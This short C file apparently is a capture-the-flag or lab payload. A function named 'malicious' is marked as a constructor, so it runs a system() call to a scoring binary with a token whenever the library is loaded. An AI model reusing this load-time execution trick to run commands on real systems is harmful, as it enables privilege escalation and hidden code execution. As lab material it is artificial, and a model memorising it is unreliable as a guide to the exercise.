#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious(){
	system("/usr/local/bin/score 337c3f20-e288-4343-aa95-5ad3ee1ae99e");
}
